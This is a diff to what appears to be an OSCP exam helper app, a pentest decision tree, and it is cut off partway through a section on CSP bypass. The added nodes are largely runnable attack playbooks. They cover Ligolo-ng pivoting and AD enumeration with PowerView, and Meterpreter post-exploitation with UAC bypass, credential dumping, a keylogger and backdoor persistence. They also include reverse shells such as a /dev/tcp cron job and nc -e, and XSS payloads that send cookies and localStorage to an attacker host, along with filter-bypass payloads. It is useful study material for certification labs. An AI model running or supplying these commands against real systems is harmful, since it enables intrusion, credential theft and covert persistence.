@@ -301,6 +301,7 @@ searchsploit -x <path/to/exploit>`,
     warn: null,
     choices: [
       { label: "AD entry — assumed breach", next: "ad_start" },
+      { label: "LDAP enum — .NET/PowerShell/PowerView", next: "ad_ldap_enum" },
       { label: "BloodHound — run and read", next: "bloodhound" },
       { label: "Responder / LLMNR poisoning", next: "responder" },
       { label: "AS-REP roasting", next: "asrep_roast" },
@@ -481,32 +482,156 @@ netstat -ano`,
       { label: "Ligolo-ng tunnel", next: "ligolo" },
       { label: "Socat port forward", next: "manual_portfwd" },
       { label: "No tools — bash/python scanner", next: "pivot_portscan" },
-      { label: "⬡ Open Pivot Calculator (generates exact commands)", href: "https://path.jimi421.com/pivot" },
+      { label: "⬡ Open Pivot Calculator (generates exact commands)", href: "https://path.jimi421.com/pivot", next: "pivot_start" },
     ],
   },
 
   ligolo: {
     phase: "PIVOT",
-    title: "Ligolo-ng Tunnel",
-    body: "Cleanest tunnel for OSCP. Proxy on Kali, agent on pivot. Once running your Kali tools hit internal hosts directly — no proxychains needed.",
-    cmd: `sudo ip tuntap add user $(whoami) mode tun ligolo
+    title: "Ligolo-ng — Full Workflow (Single, Double Pivot, Local Port Forward)",
+    body: "Cleanest tunnel available. Proxy on Kali, agent on pivot. Once running your Kali tools hit internal hosts directly — no proxychains needed. Credit to ph03n1x cheatsheet for the magic 240.0.0.1 trick.",
+    cmd: `# ══════════════════════════════════════════════════
+# SETUP — Download 3 binaries
+# ══════════════════════════════════════════════════
+# Use version 0.6.2 — most stable
+# proxy           (Kali)
+# agent.exe       (Windows target)
+# agent           (Linux target)
+# GitHub: nicocha30/ligolo-ng/releases/tag/v0.6.2
+
+# ══════════════════════════════════════════════════
+# PART 1: SINGLE PIVOT — 1st internal range
+# ══════════════════════════════════════════════════
+
+# -- STEP 1: Create TUN interface on Kali ---------
+sudo ip tuntap add user root mode tun tunnel1
+sudo ip link set tunnel1 up
+
+# -- STEP 2: Start proxy on Kali ------------------
+sudo ./proxy -selfcert
+# Default listener: 0.0.0.0:11601
+
+# -- STEP 3: Upload + run agent on pivot target ---
+# Windows:
+.\\agent.exe -connect 192.168.45.210:11601 -ignore-cert
+# Linux:
+./agent -connect 192.168.45.210:11601 -ignore-cert
+
+# -- STEP 4: Attach to tunnel in proxy UI ---------
+# Once agent connects, hit Enter in proxy UI
+# Select agent with arrow keys, then run:
+start --tun tunnel1
+
+# -- STEP 5: Route internal subnet (new terminal) --
+# Pivot's internal IP was 10.10.10.10 → subnet is 10.10.10.0/24
+sudo ip route add 10.10.10.0/24 dev tunnel1
+
+# -- STEP 6: Listener for new hosts to reach proxy --
+# This lets 2nd-hop agents connect back through the tunnel
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+
+# -- STEP 7: Test reachability --------------------
+netexec smb 10.10.10.0/24
+nmap -sT -Pn 10.10.10.0/24
+# No proxychains needed — Kali tools work natively
+
+# ══════════════════════════════════════════════════
+# PART 2: DOUBLE PIVOT — 2nd internal range
+# ══════════════════════════════════════════════════
+# Scenario: 1st pivot (10.10.10.10) has a 2nd NIC into 11.11.11.0/24
+# 2nd target internal IP = 11.11.11.11
+
+# -- STEP 1: Create tunnel2 on Kali ---------------
+sudo ip tuntap add user root mode tun tunnel2
+sudo ip link set tunnel2 up
+
+# -- STEP 2: Connect 2nd agent to 1st pivot's IP --
+# Run on 2nd target — connects to 1st pivot's INTERNAL IP
+.\\agent.exe -connect 10.10.10.10:11601 -ignore-cert
+./agent -connect 10.10.10.10:11601 -ignore-cert
+
+# -- STEP 3: Attach new session to tunnel2 --------
+# In proxy UI — NEW connection appeared, select it with arrows
+# Make sure you're on the right connection then:
+start --tun tunnel2
+
+# -- STEP 4: Route the 2nd subnet -----------------
+sudo ip route add 11.11.11.0/24 dev tunnel2
+
+# -- STEP 5: Reverse listeners on common ports ----
+# So reverse shells from 2nd target can reach Kali
+listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
+listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
+
+# -- STEP 6: Download from 2nd target via 1st -----
+# On 2nd target, pull files FROM 1st pivot which is hosting them:
+wget http://10.10.10.10/tool.exe -O tool.exe
+iwr -uri http://10.10.10.10/tool.exe -OutFile tool.exe
+
+# -- STEP 7: Catch reverse shell from 2nd target --
+# Shell connects to 1st pivot IP on listener port, tunnels back to Kali
+nc64.exe 10.10.10.10 443 -e cmd.exe
+
+# -- STEP 8: Test 2nd subnet reachability --------
+netexec smb 11.11.11.0/24
+
+# ══════════════════════════════════════════════════
+# PART 3: LOCAL PORT FORWARD — Magic 240.0.0.1 trick
+# ══════════════════════════════════════════════════
+# Use case: target has a service on 127.0.0.1:8080 or some port
+# that's ONLY reachable from the target itself
+# This maps ALL local ports on the target → 240.0.0.1 on Kali
+# Works with Firefox, curl, nmap — no proxychains
+
+# -- STEP 1: Create ligolo interface --------------
+sudo ip tuntap add user root mode tun ligolo
 sudo ip link set ligolo up
-./proxy -selfcert -laddr 0.0.0.0:11601
 
-# Linux pivot:   ./agent -connect $lhost:11601 -ignore-cert
-# Windows pivot: .\\agent.exe -connect $lhost:11601 -ignore-cert
+# -- STEP 2: Start proxy (if not running) ---------
+sudo ./proxy -selfcert
 
-session
-[select number]
-start
+# -- STEP 3: Connect agent -----------------------
+.\\agent.exe -connect 192.168.45.210:11601 -ignore-cert
 
-sudo ip route add $pivot_subnet dev ligolo
-ping 172.16.50.1`,
-    warn: "Add the route AFTER the tunnel starts. Without the route traffic does not flow.",
+# -- STEP 4: Attach to ligolo interface -----------
+start --tun ligolo
+
+# -- STEP 5: THE MAGIC ROUTE ---------------------
+# 240.0.0.1 is reserved IP space — ligolo maps ALL target local ports here
+sudo ip route add 240.0.0.1/32 dev ligolo
+
+# -- STEP 6: Access target's local ports from Kali --
+nmap -p- 240.0.0.1                       # scan all target local ports
+curl http://240.0.0.1:8080               # hit internal webapp
+firefox http://240.0.0.1:8080            # browser access
+psql -h 240.0.0.1 -p 5432 -U postgres    # hit local DB
+
+# ══════════════════════════════════════════════════
+# TROUBLESHOOTING
+# ══════════════════════════════════════════════════
+# Agent won't connect:
+#   - Firewall on pivot blocking outbound? Try port 443 not 11601:
+#     sudo ./proxy -selfcert -laddr 0.0.0.0:443
+#     .\\agent.exe -connect KALI:443 -ignore-cert
+#
+# No route to host after adding route:
+#   - Did you 'start --tun tunnelN' IN THE PROXY UI first?
+#   - Route must come AFTER tunnel start, not before
+#
+# Tunnel works but tools fail:
+#   - Check route: ip route | grep tunnel1
+#   - Verify interface up: ip link show tunnel1
+#
+# Windows agent fails with "could not load module":
+#   - GLIBC mismatch or missing VCRuntime
+#   - Use static build from releases, not dev build`,
+    warn: "Add the route AFTER 'start --tun' in the proxy UI — order matters. Use version 0.6.2 — newer versions have broken sessions in OSCP labs. Double pivot: 2nd agent connects to 1st pivot's INTERNAL IP, not Kali IP. Magic 240.0.0.1/32 route only works with a tunnel named 'ligolo' (not tunnel1/tunnel2) per convention but any name works — just match in the route.",
     choices: [
       { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
-      { label: "Tunnel up — scan known internal target", next: "pivot_portscan" },
-      { label: "Need to chain through another pivot", next: "double_pivot" },
+      { label: "Tunnel up — scan internal target", next: "pivot_portscan" },
+      { label: "2nd pivot — chain through another host", next: "double_pivot" },
+      { label: "Open Pivot Calculator", href: "https://path.jimi421.com/pivot", next: "pivot_start" },
+      { label: "Back to pivot menu", next: "pivot_start" },
     ],
   },
 
@@ -1177,6 +1302,188 @@ curl "http://$ip/page?url=gopher://127.0.0.1:25/"`,
     choices: [
       { label: "Got RCE via SSTI", next: "reverse_shell" },
       { label: "Reflected but no RCE — different engine", next: "web_fuzz_deep" },
+    ],
+  },
+
+  ad_ldap_enum: {
+    phase: "AD",
+    title: "AD LDAP Enumeration — .NET, PowerShell, PowerView",
+    body: "Three ways to query AD: legacy net.exe (fast, basic), .NET DirectoryServices (always available, exam-safe), PowerView (most powerful, needs import). AD = LDAP under the hood. From an assumed breach foothold, start here.",
+    cmd: `# ══════════════════════════════════════════════════
+# METHOD 1: LEGACY net.exe — always available, no RSAT
+# ══════════════════════════════════════════════════
+# Fast first look — no tools to upload, runs on any Windows host
+
+net user /domain                            # all domain users
+net user jeffadmin /domain                  # specific user — shows group memberships
+net group /domain                           # all domain groups
+net group "Domain Admins" /domain           # members of a group
+net group "Sales Department" /domain        # custom group members
+net accounts /domain                        # password policy + lockout threshold
+net view /domain                            # domain computers
+nltest /domain_trusts                       # trust relationships
+nltest /dclist:corp.com                     # list DCs
+
+# LIMITATION of net.exe: only shows DIRECT user members, MISSES nested groups
+# "Sales Department" may show 2 users via net.exe but actually contain a group
+# that contains more users. Use .NET/PowerView to see nested groups.
+
+# ══════════════════════════════════════════════════
+# METHOD 2: .NET DirectoryServices — always available
+# ══════════════════════════════════════════════════
+# Works on ANY Windows host with .NET (all of them). No RSAT. No AMSI flags.
+# This is the exam-safe approach.
+
+# -- STEP 1: FIND THE PRIMARY DC (PDC) -------------
+# Single most-updated DC — query this one for freshest data
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+# Output shows PdcRoleOwner : DC1.corp.com ← this is what you want
+
+# -- STEP 2: BUILD LDAP PATH DYNAMICALLY -----------
+# Format: LDAP://HostName[:Port][/DistinguishedName]
+# Example: LDAP://DC1.corp.com/DC=corp,DC=com
+$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName
+$LDAP = "LDAP://$PDC/$DN"
+$LDAP                                       # verify: LDAP://DC1.corp.com/DC=corp,DC=com
+
+# -- STEP 3: REUSABLE LDAPSearch FUNCTION ----------
+# Save as function.ps1 — import with: Import-Module .\function.ps1
+function LDAPSearch {
+    param ([string]$LDAPQuery)
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+    return $DirectorySearcher.FindAll()
+}
+
+# Bypass execution policy to run the script:
+# powershell -ep bypass
+# Then: Import-Module .\function.ps1
+
+# ══════════════════════════════════════════════════
+# CORE LDAP FILTERS — memorize these
+# ══════════════════════════════════════════════════
+# samAccountType values (decimal):
+#   805306368 = users (0x30000000)
+#   805306369 = computers
+#   268435456 = security groups
+#   268435457 = non-security groups
+
+# -- All users in domain ---------------------------
+LDAPSearch -LDAPQuery "(samAccountType=805306368)"
+LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user))"
+
+# -- All computers ---------------------------------
+LDAPSearch -LDAPQuery "(objectCategory=computer)"
+
+# -- All groups ------------------------------------
+LDAPSearch -LDAPQuery "(objectclass=group)"
+
+# -- Specific user — all properties ----------------
+$user = LDAPSearch -LDAPQuery "(name=jeffadmin)"
+foreach ($obj in $user) {
+    foreach ($prop in $obj.Properties) { $prop }
+    Write-Host "-------------------------------"
+}
+
+# -- Group members (finds NESTED groups) -----------
+$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
+$group.properties.member
+# Output shows users AND nested groups — recurse manually for full map
+
+# -- Kerberoastable users (SPN set) — HIGH VALUE ---
+LDAPSearch -LDAPQuery "(&(objectCategory=user)(servicePrincipalName=*))"
+# Any user account with SPN = Kerberoastable = offline hash crack opportunity
+
+# -- AS-REP roastable (DONT_REQ_PREAUTH flag) ------
+LDAPSearch -LDAPQuery "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+
+# -- High-priv accounts (adminCount=1) -------------
+LDAPSearch -LDAPQuery "(&(objectCategory=user)(adminCount=1))"
+
+# -- Description field (passwords often leaked here) --
+LDAPSearch -LDAPQuery "(&(objectCategory=user)(description=*))" | ForEach-Object {
+    $_.Properties["samaccountname"], $_.Properties["description"]
+}
+
+# ══════════════════════════════════════════════════
+# METHOD 3: POWERVIEW — the standard tool
+# ══════════════════════════════════════════════════
+# Written by HarmJ0y. Wraps .NET into clean cmdlets.
+# Pre-installed on OSCP exam client at C:\Tools\PowerView.ps1
+# In the wild: AMSI-flagged, use obfuscated version or bypass AMSI first
+
+# -- IMPORT ----------------------------------------
+Import-Module .\PowerView.ps1
+# Or from URL after AMSI bypass:
+# IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerView.ps1')
+
+# -- DOMAIN INFO -----------------------------------
+Get-NetDomain                               # domain info, PDC
+Get-NetDomainController                     # all DCs
+Get-DomainPolicy                            # password/lockout policy
+
+# -- USERS -----------------------------------------
+Get-NetUser                                 # all users — all attributes
+Get-NetUser | select cn,pwdlastset,lastlogon  # clean view of dormant accounts
+Get-NetUser -SPN                            # Kerberoastable (HIGH VALUE)
+Get-NetUser -PreauthNotRequired             # AS-REP roastable (HIGH VALUE)
+Get-NetUser -AdminCount                     # protected/privileged accounts
+Get-NetUser | Where {$_.memberof -match "Domain Admins"}
+
+# -- GROUPS ----------------------------------------
+Get-NetGroup | select cn                    # all groups
+Get-NetGroup "Domain Admins"                # specific group
+Get-NetGroupMember "Domain Admins"          # direct members
+Get-DomainGroupMember "Domain Admins" -Recurse  # RECURSIVE — finds nested
+
+# -- COMPUTERS -------------------------------------
+Get-NetComputer                             # all computers
+Get-NetComputer | select name,operatingsystem,operatingsystemversion
+Get-DomainComputer -Unconstrained           # unconstrained delegation (HIGH VALUE)
+Get-DomainComputer -TrustedToAuth           # constrained delegation
+
+# -- LOGGED-ON USERS / SESSIONS --------------------
+Get-NetLoggedon -ComputerName dc1.corp.com  # who's logged into this machine
+Get-NetSession -ComputerName dc1.corp.com   # active sessions
+Find-DomainUserLocation -UserName jeffadmin # hunt a specific user's location
+Invoke-UserHunter                           # find where DAs are logged in
+
+# -- LOCAL ADMIN ACCESS ----------------------------
+Find-LocalAdminAccess                       # which computers am I local admin on?
+# This is BIG — finds lateral movement paths immediately
+
+# -- SHARES ----------------------------------------
+Find-DomainShare                            # all shares in domain
+Find-DomainShare -CheckShareAccess          # shares I can access
+Find-InterestingDomainShareFile             # hunt for passwords/keys in shares
+
+# -- ACL ABUSE HUNTING -----------------------------
+Get-DomainObjectAcl -Identity "jeffadmin" -ResolveGUIDs
+Find-InterestingDomainAcl                   # find abusable ACLs
+
+# ══════════════════════════════════════════════════
+# TYPICAL EXAM WORKFLOW
+# ══════════════════════════════════════════════════
+# 1. RDP in with low-priv creds (assumed breach)
+# 2. net user /domain + net group "Domain Admins" /domain — 30 seconds
+# 3. Import-Module PowerView.ps1
+# 4. Get-NetUser -SPN → if ANY SPN user, Kerberoast immediately
+# 5. Get-NetUser -PreauthNotRequired → AS-REP roast if found
+# 6. Find-LocalAdminAccess → lateral movement map
+# 7. Get-NetGroup "Domain Admins" → who owns the domain
+# 8. Get-NetUser | select cn,description → passwords in description field
+# 9. If nothing obvious → BloodHound`,
+    warn: "RDP in rather than WinRM — PowerShell Remoting causes Kerberos Double-Hop which breaks enumeration tools. net.exe MISSES nested groups (jen appears only in Management Department but is inherited into Sales via nesting). Always check password policy BEFORE spraying. PowerView is AMSI-flagged in modern environments — on exam it's pre-installed at C:\\Tools\\PowerView.ps1.",
+    choices: [
+      { label: "Found SPN user — Kerberoast", next: "kerberoast" },
+      { label: "Found DONT_REQ_PREAUTH — AS-REP roast", next: "asrep_roast" },
+      { label: "Found local admin access elsewhere", next: "lateral_movement" },
+      { label: "Run BloodHound for full graph", next: "bloodhound" },
+      { label: "Check ACL abuse paths", next: "acl_abuse" },
+      { label: "Back to AD jump menu", next: "jump_ad" },
     ],
   },
 
@@ -3970,6 +4277,211 @@ nc -nlvp 443
     ],
   },
 
+  msf_post_windows: {
+    phase: "POST",
+    title: "Meterpreter — Windows Post Exploitation",
+    body: "Dedicated Meterpreter post-exploit workflow for Windows. Run these in order: situational awareness → privilege escalation → credential dumping → persistence → pivot.",
+    cmd: `# ── STEP 1: SITUATIONAL AWARENESS ────────────────────
+sysinfo                            # OS, hostname, arch
+getuid                             # current user
+getpid                             # current process ID
+idletime                           # is user at keyboard?
+ps                                 # list all processes
+
+# ── STEP 2: CHECK PRIVILEGES ──────────────────────────
+shell                              # drop to cmd
+whoami /priv                       # check SeImpersonatePrivilege etc
+whoami /groups                     # group membership
+net user                           # local users
+net localgroup administrators      # who's admin?
+exit                               # back to meterpreter
+
+# ── STEP 3: PRIVILEGE ESCALATION ──────────────────────
+# If SeImpersonatePrivilege enabled:
+getsystem                          # auto privesc → SYSTEM
+getuid                             # confirm SYSTEM
+
+# If getsystem fails — UAC bypass:
+bg                                 # background session
+use exploit/windows/local/bypassuac_sdclt
+set SESSION <id>
+set LHOST 192.168.45.210
+run                                # spawns high-integrity session
+
+# ── STEP 4: PROCESS MIGRATION ─────────────────────────
+# Move out of suspicious process into legit one
+ps                                 # find good target (explorer, OneDrive, svchost)
+migrate <PID>                      # migrate to that PID
+execute -H -f notepad              # spawn hidden process if none suitable
+migrate <new_PID>
+
+# ── STEP 5: CREDENTIAL DUMPING ────────────────────────
+# Requires SYSTEM
+load kiwi
+creds_all                          # dump everything
+creds_msv                          # NTLM hashes
+creds_wdigest                      # plaintext (older systems)
+lsa_dump_sam                       # SAM database
+lsa_dump_secrets                   # LSA secrets
+hashdump                           # quick SAM dump (no kiwi needed)
+
+# ── STEP 6: SITUATIONAL AWARENESS (NETWORK) ───────────
+shell
+ipconfig /all                      # find other interfaces/subnets
+route print                        # routing table
+arp -a                             # ARP cache — other live hosts
+netstat -ano                       # active connections
+exit
+
+# ── STEP 7: FILE SYSTEM HUNTING ───────────────────────
+search -f *.txt -d C:\Users       # find text files
+search -f *password* -d C:\       # find password files
+search -f *pass* -d C:\           # broader search
+search -f *.kdbx -d C:\          # KeePass databases
+search -f SAM -d C:\Windows\System32\config
+download C:\\\\xampp\passwords.txt  # download specific file
+download C:\Users\Administrator\Desktop\flag.txt
+lcd /home/kali/loot                # set local download dir
+download C:\Users -r              # recursive download
+
+# ── STEP 8: PERSISTENCE ───────────────────────────────
+# Registry run key:
+shell
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\Users\Public\met.exe"
+
+# Scheduled task:
+schtasks /create /tn "updater" /tr "C:\Users\Public\met.exe" /sc onlogon /ru SYSTEM
+
+# ── STEP 9: PIVOT TO INTERNAL NETWORK ─────────────────
+bg                                 # background session
+use multi/manage/autoroute
+set SESSION <id>
+run                                # auto-add internal routes
+route print                        # confirm routes added
+
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+# Update /etc/proxychains4.conf: socks5 127.0.0.1 1080
+
+# Port forward specific service:
+sessions -i <id>
+portfwd add -l 3389 -p 3389 -r 172.16.5.200
+# Then: xfreerdp /v:127.0.0.1 /u:luiza
+
+# ── USEFUL EXTRAS ─────────────────────────────────────
+screenshare                        # live desktop view
+keyscan_start                      # start keylogger
+keyscan_dump                       # dump keystrokes
+keyscan_stop
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_applications
+run post/multi/recon/local_exploit_suggester  # suggest local exploits`,
+    warn: "Always migrate out of your initial process — if the user closes the app your session dies. Kiwi requires SYSTEM. getsystem uses SeImpersonatePrivilege (PrintSpooler variant) — check whoami /priv first.",
+    choices: [
+      { label: "SeImpersonatePrivilege — Potato attacks", next: "token_privs" },
+      { label: "Need UAC bypass", next: "win_uac_bypass" },
+      { label: "Pivot to internal network", next: "pivot_start" },
+      { label: "Full Windows post exploit (manual)", next: "windows_post_exploit" },
+      { label: "Back to MSF", next: "msfconsole" },
+    ],
+  },
+
+  msf_post_linux: {
+    phase: "POST",
+    title: "Meterpreter — Linux Post Exploitation",
+    body: "Dedicated Meterpreter post-exploit workflow for Linux. Situational awareness → privesc → credential hunting → pivot.",
+    cmd: `# ── STEP 1: SITUATIONAL AWARENESS ────────────────────
+sysinfo                            # OS, hostname, arch
+getuid                             # current user
+getpid                             # current process
+ps                                 # running processes
+
+# ── STEP 2: SHELL + MANUAL ENUM ──────────────────────
+shell                              # drop to bash/sh
+python3 -c 'import pty; pty.spawn("/bin/bash")'  # upgrade TTY
+id                                 # uid/gid/groups
+sudo -l                            # sudo permissions
+cat /etc/passwd                    # all users
+cat /etc/crontab                   # cron jobs
+find / -perm -4000 2>/dev/null     # SUID binaries
+uname -a                           # kernel version
+cat /proc/version
+ss -ntlp                           # listening services
+ip a                               # network interfaces — find pivot subnets
+arp -a                             # other live hosts
+exit                               # back to meterpreter
+
+# ── STEP 3: UPLOAD + RUN LINPEAS ──────────────────────
+upload /home/kali/tools/linpeas.sh /tmp/linpeas.sh
+shell
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh 2>/dev/null | tee /tmp/out.txt
+exit
+download /tmp/out.txt              # pull results to Kali
+
+# ── STEP 4: FILE HUNTING ──────────────────────────────
+search -f *.conf -d /etc          # config files
+search -f *password* -d /home     # password files
+search -f id_rsa -d /home         # SSH private keys
+search -f .bash_history -d /home  # command history
+download /etc/shadow               # shadow file (needs root)
+download /root/.ssh/id_rsa         # root SSH key (needs root)
+
+# ── STEP 5: PRIVILEGE ESCALATION ──────────────────────
+# Try getsystem (limited on Linux):
+getsystem
+
+# Better — drop to shell and use manual techniques:
+shell
+# sudo -l → check GTFOBins
+# SUID → check GTFOBins
+# Writable cron → inject reverse shell
+# Kernel exploit → check uname -a version
+
+# ── STEP 6: POST-EXPLOITATION MODULES ─────────────────
+bg                                 # background session
+run post/linux/gather/hashdump     # dump /etc/shadow
+run post/linux/gather/enum_configs # enumerate config files
+run post/linux/gather/enum_network # network info
+run post/multi/recon/local_exploit_suggester  # suggest exploits
+
+# ── STEP 7: PIVOT ─────────────────────────────────────
+# Check for internal networks first:
+shell
+ip a                               # look for multiple interfaces
+ip route                           # routing table
+exit
+
+bg
+use multi/manage/autoroute
+set SESSION <id>
+run
+route print
+
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+# proxychains4.conf: socks5 127.0.0.1 1080
+
+# ── STEP 8: PERSISTENCE ───────────────────────────────
+shell
+# Add SSH key:
+echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+# Add cron reverse shell:
+echo "* * * * * root bash -i >& /dev/tcp/LHOST/443 0>&1" >> /etc/crontab`,
+    warn: "Linux Meterpreter has fewer built-in post-exploit features than Windows. Drop to shell for most Linux privesc work. getsystem rarely works on Linux — use manual techniques.",
+    choices: [
+      { label: "Sudo misconfiguration", next: "sudo_check" },
+      { label: "SUID binaries", next: "suid_check" },
+      { label: "Run LinPEAS", next: "linpeas" },
+      { label: "Pivot to internal network", next: "pivot_start" },
+      { label: "Full Linux post exploit (manual)", next: "linux_post_exploit" },
+      { label: "Back to MSF", next: "msfconsole" },
+    ],
+  },
+
   msfconsole: {
     phase: "EXPLOIT",
     title: "Metasploit Framework (MSF)",
@@ -4319,8 +4831,8 @@ sudo msfconsole -r listener.rc    # load on startup
 # Built-ins: /usr/share/metasploit-framework/scripts/resource/`,
     warn: "OSCP: AUXILIARY modules are UNRESTRICTED — scan/enum/brute freely. Exploit modules limited to ONE machine only — choose wisely. Port 4444 commonly blocked — use 443 or 80. Staged payloads need multi/handler not nc. sessions -u upgrades shell→Meterpreter without re-exploiting.",
     choices: [
-      { label: "Meterpreter — Windows post exploit", next: "token_privs" },
-      { label: "Meterpreter — Linux post exploit", next: "linux_privesc_extra" },
+      { label: "Meterpreter — Windows post exploit", next: "msf_post_windows" },
+      { label: "Meterpreter — Linux post exploit", next: "msf_post_linux" },
       { label: "Pivot through MSF session", next: "pivot_start" },
       { label: "Generate payload", next: "msfvenom" },
       { label: "Jump to technique", next: "jump_menu" },
@@ -5030,25 +5542,215 @@ wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
 
   xss: {
     phase: "WEB",
-    title: "XSS",
-    body: "XSS alone rarely wins. Cookie theft → session hijack → admin access is the path. Stored XSS is far more valuable than reflected.",
-    cmd: `# Cookie theft
+    title: "XSS — Context-Aware Exploitation",
+    body: "XSS alone rarely wins — cookie theft → session hijack → admin access is the real path. Identify the CONTEXT first (HTML, attribute, JS, CSS, URL) — right context = right payload. Progressive escalation beats blind payload spraying. Resource: xssnow.in for 900+ curated payloads + WAF bypass database.",
+    cmd: `# ══════════════════════════════════════════════════
+# STEP 1: IDENTIFY INJECTION CONTEXT (most important)
+# ══════════════════════════════════════════════════
+# Submit a canary to find where output lands:
+CANARY_xsstest_CANARY
+# Then view source (Ctrl+U) and Ctrl+F for CANARY
+# The HTML around your canary = the context
+
+# ══════════════════════════════════════════════════
+# STEP 2: PROGRESSIVE PAYLOAD ESCALATION
+# ══════════════════════════════════════════════════
+# Start simple — climb only as far as needed
+
+# Level 1 — Can I inject HTML at all?
+<h1>test</h1>
+<b>test</b>
+
+# Level 2 — Direct script execution?
+<script>alert(1)</script>
+
+# Level 3 — Script blocked? Try event handlers
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+# Level 4 — Need to break out of context
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><svg onload=alert(1)>
+'-alert(1)-'
+";alert(1);//
+
+# Level 5 — Polyglot (works in multiple contexts)
+# Full polyglot contains backticks — see xssnow.in for copy-paste version
+# Short version that works in most contexts:
+"><svg/onload=alert(1)>
+javascript:/*--></title></style></textarea></script><svg onload=alert(1)>
+
+# ══════════════════════════════════════════════════
+# THE 5 CONTEXTS — pick the right payload
+# ══════════════════════════════════════════════════
+
+# ── CONTEXT 1: HTML ──────────────────────────────
+# Vulnerable: <div>Hello YOUR_INPUT</div>
+# Payloads:
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+
+# ── CONTEXT 2: HTML ATTRIBUTE ────────────────────
+# Vulnerable: <input value="YOUR_INPUT">
+# Must break out of the quotes first:
+" onmouseover="alert(1)
+" autofocus onfocus="alert(1)
+"><script>alert(1)</script>
+"><svg onload=alert(1)>
+# No quotes needed? Just inject event handler:
+x onmouseover=alert(1) x=
+
+# ── CONTEXT 3: JAVASCRIPT STRING ─────────────────
+# Vulnerable: <script>var x='YOUR_INPUT';</script>
+# Break the string, execute, comment the rest:
+';alert(1);//
+';alert(1);/*
+\\';alert(1);//                    # escape-resistant sinks
+</script><script>alert(1)</script>   # break out of script tag entirely
+
+# ── CONTEXT 4: CSS ───────────────────────────────
+# Vulnerable: <style>body { background: YOUR_INPUT; }</style>
+red; } </style><script>alert(1)</script>
+# CSS expression (old IE only, still works on legacy apps):
+expression(alert(1))
+
+# ── CONTEXT 5: URL / href ────────────────────────
+# Vulnerable: <a href="YOUR_INPUT">link</a>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+javascript&colon;alert(1)
+
+# ══════════════════════════════════════════════════
+# COOKIE THEFT — real exploitation
+# ══════════════════════════════════════════════════
+# Simple exfil via image beacon (works through most WAFs):
+<script>new Image().src='http://$lhost/?c='+btoa(document.cookie)</script>
+
+# POST exfil (for longer data):
 <script>
-  fetch('http://$lhost/?c='+btoa(document.cookie))
+fetch('http://$lhost/', {
+  method:'POST',
+  body: JSON.stringify({
+    c: document.cookie,
+    url: location.href,
+    ls: JSON.stringify(localStorage)
+  })
+})
 </script>
 
-# Listen for cookies
+# Listener:
 nc -nlvp 80
+# Or python for better parsing:
+python3 -m http.server 80
 
-# BeEF for advanced exploitation (if available)
-# Hook: <script src="http://$lhost:3000/hook.js"></script>
+# If HttpOnly blocks cookie — grab session via XHR instead:
+<script>
+fetch('/admin/panel').then(r=>r.text()).then(d=>{
+  fetch('http://$lhost/?d='+btoa(d))
+})
+</script>
 
-# CSP bypass check
-curl -sv http://$ip | grep -i "content-security-policy"`,
-    warn: null,
+# ══════════════════════════════════════════════════
+# FILTER / WAF BYPASS — if payloads get blocked
+# ══════════════════════════════════════════════════
+# Case variation (case-sensitive blacklists):
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+
+# Non-standard whitespace separators (bypass regex filters):
+<img\fsrc=x\fonerror=alert(1)>       # \f = form feed
+<img\rsrc=x\ronerror=alert(1)>       # \r = carriage return
+<img\vsrc=x\vonerror=alert(1)>       # \v = vertical tab
+
+# Encoded payloads:
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=%61%6C%65%72%74%28%31%29>   # URL encoded
+
+# Template literals (no parens needed):
+<script>alert/**/(1)</script>
+
+# Function constructor (when 'alert' or 'eval' blocked):
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+
+# HTML5 event handlers (old filters miss these):
+<video onloadstart=alert(1)>
+<audio oncanplay=alert(1) src=x>
+<details open ontoggle=alert(1)>
+<input oninvalid=alert(1) required>
+
+# ══════════════════════════════════════════════════
+# DOM-BASED XSS — pure client-side
+# ══════════════════════════════════════════════════
+# Look in JS source for sinks reading from user-controlled sources
+
+# Sources (data comes IN from here):
+# location.href, location.search, location.hash
+# document.referrer, window.name, postMessage data
+
+# Sinks (bad place to put data):
+# innerHTML, outerHTML, document.write()
+# eval(), setTimeout('string'), setInterval('string')
+# location.href = ..., element.src = ...
+
+# Classic DOM XSS payload — URL fragment:
+http://target/page.html#<img src=x onerror=alert(1)>
+http://target/page.html#<script>alert(1)</script>
+
+# ══════════════════════════════════════════════════
+# CSP BYPASS — when CSP blocks inline scripts
